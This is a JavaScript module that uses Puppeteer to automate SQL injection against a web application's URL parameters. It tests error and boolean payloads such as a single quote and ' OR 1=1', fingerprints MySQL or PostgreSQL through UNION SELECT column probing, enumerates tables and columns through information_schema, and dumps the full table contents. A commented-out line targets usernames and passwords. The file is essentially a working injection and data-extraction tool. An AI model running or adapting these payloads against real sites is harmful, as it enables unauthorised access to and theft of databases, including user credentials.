import { launch } from "puppeteer";

const dataBasesEngines = {
  mysql: ["database()", "user()", "version()", "datadir()"],
  postgresql: ["current_database()", "current_user()", "pg_version()"],
  // sqlite: ["sqlite_version()"],
};

const extractData = (data) => {
  // console.log("data : ", data);
  let nbNull = 0;
  let tot = 0;
  let result;

  for (const prop in data) {
    tot++;
    if (data[prop] === null) {
      nbNull++;
    } else {
      result = data[prop];
    }
  }

  if (result && tot - nbNull === 1) return result;
};

function areEqualArrays(arr1, arr2) {
  if (arr1.length !== arr2.length) return false;

  for (let obj1 of arr1) {
    const obj2 = arr2.find(
      (o2) =>
        Object.keys(obj1).length === Object.keys(o2).length &&
        Object.keys(obj1).every((p) => obj1[p] === o2[p])
    );

    if (!obj2) return false;
  }

  return true;
}

let paramsSite = [];

const getParams = async (page, dbData) => {
  let resulat = await page.evaluate(() => {
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());
    return params;
    // console.log("params: ", params);
  });
  console.log("params: ", resulat);
  paramsSite.push(resulat);
  dbData.vulnerableParameters.push(resulat);
};

const payloadsError = ["'"];
const payloadsBoolean = [" OR 1=1", " OR 1=1 -- "];

const testVulnError = async (baseUrl, page, dbData) => {
  for (const payloadError of payloadsError) {
    const serverResponse = new Promise(async (resolve, reject) => {
      page.on("response", async (response) => {
        if (response.status() == 404) {
          console.log("Error: 404 Not Found");
          process.exit(1);
        }
        if (((response.status() / 100) | 0) == 5) {
          // console.log("Error: 500 Internal Server Error");
          resolve("ERROR 5xx");
          // process.exit(1);
        }
        try {
          let data;
          data = await response.json(); //.json() me throw error if return html page
          // console.log("data : ", data);
          resolve(data);
        } catch (error) {
          // console.log("error : ", error);
        }
      });
    });

    const encodedPayload = encodeURIComponent(payloadError);
    // console.log("essai : ", essai);
    const urlReuqest = baseUrl + encodedPayload;

    await page.goto(urlReuqest);
    const result = await serverResponse;

    if (result === "ERROR 5xx") {
      console.log("base url ref : ", baseUrl);
      dbData.payloadsUsed.push(payloadError);
      await page.goto(baseUrl);
      return true;
    }
  }
  // await page.goto(refBaseUrl);
  return false;
};

const testVulnBoolean = async (baseUrl, page, dbData) => {
  const results = [];
  for (const payload of payloadsBoolean) {
    const serverResponse = new Promise(async (resolve, reject) => {
      page.on("response", async (response) => {
        if (response.status() == 404) {
          console.log("Error: 404 Not Found");
          process.exit(1);
        }
        if (((response.status() / 100) | 0) == 5) {
          // console.log("Error: 500 Internal Server Error");
          resolve("ERROR 5xx");
          // process.exit(1);
        }
        try {
          let data = await response.json(); //.json() me throw error if return html page
          // console.log("data : ", data);
          resolve(data);
        } catch (error) {
          // console.log("error : ", error);
        }
      });
    });

    const encodedPayload = encodeURIComponent(payload);
    // console.log("essai : ", essai);
    const urlReuqest = baseUrl + encodedPayload;

    await page.goto(urlReuqest);
    const result = await serverResponse;
    // console.log("result : ", result);
    results.push(result);
    dbData.payloadsUsed.push(payload);
  }
  await page.goto(baseUrl);
  return results;
};

const testVulnerabilite = async (baseUrl, page, dbData) => {
  const refereceResponse = new Promise(async (resolve, reject) => {
    page.on("response", async (response) => {
      if (response.status() == 404) {
        console.log("Error: 404 Not Found");
        process.exit(1);
      }
      if (response.status() == 500) {
        // console.log("Error: 500 Internal Server Error");
        resolve("ERROR 500");
        // process.exit(1);
      }
      try {
        let data = await response.json(); //.json() me throw error if return html page
        // console.log("data : ", data);
        resolve(data);
      } catch (error) {
        // console.log("error : ", error);
        resolve("osef");
      }
    });
  });
  const urlReuqest = baseUrl;
  console.log("1");
  await page.goto(urlReuqest);
  console.log("2");

  const resultRef = await refereceResponse;
  console.log("3");

  const isVulError = await testVulnError(baseUrl, page, dbData);
  console.log("isVulError : ", isVulError);
  if (isVulError) return true;

  const resultsTestBool = await testVulnBoolean(baseUrl, page, dbData);
  // console.log("ref : ", resultRef);
  // console.log("resultsTestBool : ", resultsTestBool);

  if (resultsTestBool.length != resultRef.length) return true;

  for (let i = 0; i < resultsTestBool.length; i++) {
    if (!areEqualArrays(resultRef, resultsTestBool[i])) return true;
  }

  if (resultsTestBool.length == 0) return true;

  return false;
};

const getDbEngine = async (page, dbData) => {
  const baseUrl = page.url();

  for (const dataBaseEngine of Object.entries(dataBasesEngines)) {
    // console.log("dataBaseEngine", dataBaseEngine);
    for (let i = 0; i < 15; i++) {
      const payloadTestDbName =
        " UNION SELECT " + "null, ".repeat(i) + dataBaseEngine[1][0] + " -- ";
      // console.log("payloadTestDbName", payloadTestDbName);

      const serverResponse = new Promise(async (resolve, reject) => {
        page.on("response", async (response) => {
          // resolve(response);
          const status = response.status();
          if (((status / 100) | 0) === 5) {
            resolve("ERROR 500");
          }
          if (response.url().includes(encodedPayload)) {
            try {
              const data = await response.json(); //.json() me throw error if return html page
              // console.log("data : ", data);
              resolve(data[1]);
            } catch (error) {
              // console.log("error : ", error);
            }
          }
        });
      });

      const encodedPayload = encodeURIComponent(payloadTestDbName);
      const urlReuqest = baseUrl + encodedPayload;
      // console.log("urlReuqest : ", urlReuqest);

      await page.goto(urlReuqest);
      const response = await serverResponse;
      // console.log("response : ", response);

      if (response != "ERROR 500") {
        for (const elem of Object.entries(response)) {
          if (elem[1] !== null) {
            dbData.dbName = elem[1];
            dbData.dbEngine = dataBaseEngine[0];
            dbData.nbColumns = i;
            // dbData.vulnerableParameters.push({
            //   name: form.inputs[0].name,
            //   value: form.inputs[0].value,
            // });
            dbData.payloadsUsed.push(payloadTestDbName);
            await page.goto(baseUrl);
            return;
          }
        }
      }
    }
  }
  await page.goto(baseUrl);
};

const dataBasesTables = {
  mysql:
    " UNION SELECT table_name FROM information_schema.tables WHERE table_schema = '",
  postgresql:
    " UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' --  ",
};

const dbGetTables = async (page, dbData) => {
  const baseUrl = page.url();

  for (const dataBasesTable of Object.entries(dataBasesTables)) {
    // console.log("dataBaseEngine", dataBaseEngine);
    let payloadDbTable = dataBasesTable[1].replace(
      "SELECT ",
      "SELECT " + "null, ".repeat(dbData.nbColumns)
    );

    if (dataBasesTable[0] === "mysql") {
      payloadDbTable += dbData.dbName + "' -- ";
    }

    const serverResponse = new Promise(async (resolve, reject) => {
      page.on("response", async (response) => {
        // resolve(response);
        const status = response.status();
        if (((status / 100) | 0) === 5) {
          resolve("ERROR 500");
        }
        try {
          const data = await response.json(); //.json() me throw error if return html page
          // console.log("data : ", data);
          resolve(data);
        } catch (error) {
          // console.log("error : ", error);
        }
      });
    });

    const encodedPayload = encodeURIComponent(payloadDbTable);
    const urlReuqest = baseUrl + encodedPayload;
    // console.log("urlReuqest : ", urlReuqest);

    await page.goto(urlReuqest);
    const response = await serverResponse;
    // console.log("response : ", response);

    // const status = response.status();
    // console.log("Code de statut de la réponse:", status);

    // const resulat = await response.json();
    // console.log("resulat : ", resulat);

    if (response != "ERROR 500") {
      response.shift();

      for (const elem of Object.entries(response)) {
        // console.log("elem : ", elem);
        for (const e of Object.entries(elem[1])) {
          // console.log("e : ", e);
          if (e[1] !== null && !dbData.table.includes(e[1])) {
            // console.log("e : ", e);
            dbData.table.push(e[1]);
            if (!dbData.payloadsUsed.includes(payloadDbTable)) {
              dbData.payloadsUsed.push(payloadDbTable);
            }
          }
        }
      }
    }
  }
  await page.goto(baseUrl);
};

const dataBasesColumns = {
  mysql:
    " UNION SELECT column_name FROM information_schema.columns WHERE table_name = '",
  postgresql:
    " UNION SELECT column_name FROM information_schema.columns WHERE table_name = '",
};
const dbGetColumns = async (page, dbData) => {
  const baseUrl = page.url();
  const dataBasesDumpsEngine = dataBasesColumns[dbData.dbEngine];

  // for (const dataBasesTable of Object.entries(dataBasesColumns)) {
  // console.log("dataBaseEngine", dataBaseEngine);

  for (const table of dbData.table) {
    let columnsOfTable = {
      tableName: table,
      columns: [],
      data: [],
    };
    let payloadDbColumn = dataBasesDumpsEngine.replace(
      "SELECT ",
      "SELECT " + "null, ".repeat(dbData.nbColumns)
    );
    payloadDbColumn += table + "' -- ";
    // console.log("payloadTestDbColumns", payloadDbColumn);

    const serverResponse = new Promise(async (resolve, reject) => {
      page.on("response", async (response) => {
        // resolve(response);
        const status = response.status();
        if (((status / 100) | 0) === 5) {
          resolve("ERROR 500");
        }
        try {
          const data = await response.json(); //.json() me throw error if return html page
          // console.log("data : ", data);
          resolve(data);
        } catch (error) {
          // console.log("error : ", error);
        }
      });
    });

    const encodedPayload = encodeURIComponent(payloadDbColumn);
    const urlReuqest = baseUrl + encodedPayload;
    // console.log("urlReuqest : ", urlReuqest);

    await page.goto(urlReuqest);
    const response = await serverResponse;
    // console.log("response : ", response);

    // const status = response.status();
    // console.log("Code de statut de la réponse:", status);

    // const resulat = await response.json();
    // console.log("resulat : ", resulat);

    if (response != "ERROR 500") {
      // response.pop();

      for (const elem of Object.entries(response)) {
        const datatruc = extractData(elem[1]);
        // console.log("datatruc : ", datatruc);
        if (datatruc) columnsOfTable.columns.push(datatruc);
      }
    }
    if (!dbData.columns.find((c) => c.tableName === table)) {
      dbData.columns.push(columnsOfTable);
      if (!dbData.payloadsUsed.includes(payloadDbColumn))
        dbData.payloadsUsed.push(payloadDbColumn);
    }
    // }
  }
  await page.goto(baseUrl);
};

const dataBasesDumps = {
  mysql: " UNION SELECT CONCAT(concat), null FROM table -- ",
  postgresql: " UNION SELECT CONCAT(concat), null FROM table -- ",
  // test: " UNION SELECT CONCAT(id, ', ', username, ', ', password, ', ', description), null, null FROM users -- ",
  // test: "' UNION SELECT 0 AS text, CAST(CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)) AS text) AS text FROM test_db -- '",
};

const dbGetDump = async (page, dbData) => {
  const baseUrl = page.url();
  const dataBasesDumpsEngine = dataBasesDumps[dbData.dbEngine];

  for (const table of dbData.table) {
    const allColumns = dbData.columns.find((c) => c.tableName === table);
    const totalColumns = dbData.nbColumns - 1;

    for (let i = 0; i <= totalColumns; i++) {
      let allColumnsConcat = "";
      for (const column of allColumns.columns) {
        let tmp = column;
        if (dbData.dbEngine === "postgresql")
          tmp = "CAST(" + column + " AS text)";
        allColumnsConcat += tmp + ", ', ', ";
      }
      allColumnsConcat = allColumnsConcat.slice(0, -8);
      // console.log("truc milieu : ", allColumnsConcat);

      // console.log("db dump engine : ", dataBasesDumpsEngine);
      // let payloadDbDump = dataBasesDumpsEngine
      //   .replace(", null ", ", null ".repeat(dbData.nbColumns))
      //   .replace("table", table)
      //   .replace("concat", allColumnsConcat);

      let payloadDbDump = dataBasesDumpsEngine
        .replace("CONCAT(concat), null", () => {
          const truc = "CONCAT(" + allColumnsConcat + ")";
          const result =
            "null, ".repeat(i) +
            truc +
            ", ".repeat(i == totalColumns - 1 ? 0 : 1) +
            "null, ".repeat(Math.max(0, totalColumns - i - 2)) +
            "null".repeat(i == totalColumns - 1 ? 0 : 1);
          return result;
          // const test = "CONCAT(" + allColumnsConcat + "), null";
        })
        .replace("table", table);

      // payloadDbDump = dataBasesDump[1] + table + "' -- '";
      // console.log("payload\n", payloadDbDump, "\n\n");
      // console.log("payload TEST : ", dataBasesDumps.test);

      // let payloadDbColumn = dataBasesDumpsEngine.replace(
      //   "SELECT ",
      //   "SELECT " + "null, ".repeat(dbData.nbColumns)
      // );
      // payloadDbColumn += table + "' -- ";
      // console.log("payloadTestDbColumns", payloadDbColumn);

      const serverResponse = new Promise(async (resolve, reject) => {
        page.on("response", async (response) => {
          // resolve(response);
          const status = response.status();
          if (((status / 100) | 0) === 5) {
            resolve("ERROR 500");
          }
          try {
            const data = await response.json(); //.json() me throw error if return html page
            // console.log("data : ", data);
            resolve(data);
          } catch (error) {
            // console.log("error : ", error, "\n\n\n");
          }
        });
      });

      const encodedPayload = encodeURIComponent(payloadDbDump);
      const urlReuqest = baseUrl + encodedPayload;
      // console.log("urlReuqest : ", urlReuqest);

      await page.goto(urlReuqest);
      const response = await serverResponse;
      // console.log("response : ", response);

      // const status = response.status();
      // console.log("Code de statut de la réponse:", status);

      // const resulat = await response.json();
      // console.log("resulat : ", resulat);

      if (response != "ERROR 500") {
        // response.pop();
        for (const elem of response) {
          // console.log("elem", extractData(elem));
          const tmp = extractData(elem);
          if (tmp)
            dbData.columns.find((c) => c.tableName === table).data.push(tmp);

          // dbData.columns.data.push(elem[firstColumn]);
        }
      }

      if (!dbData.payloadsUsed.includes(payloadDbDump))
        dbData.payloadsUsed.push(payloadDbDump);
    }
  }
  await page.goto(baseUrl);
};

export {
  testVulnerabilite,
  getDbEngine,
  dbGetTables,
  dbGetColumns,
  getParams,
  dbGetDump,
};
